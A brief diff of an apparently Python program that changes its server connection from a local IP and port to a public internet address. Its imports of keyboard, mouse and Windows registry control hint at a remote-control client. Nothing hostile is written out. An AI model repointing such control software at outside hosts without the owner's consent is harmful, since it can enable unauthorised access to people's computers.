@@ -23,8 +23,8 @@ except ImportError:
     winreg = None
 
 # === Setup ===
-server_ip = '192.168.1.248'
-server_port = 9999
+server_ip = '147.185.221.27'
+server_port = 10434
 
 mouse = MouseController()
 keyboard = KeyboardController()
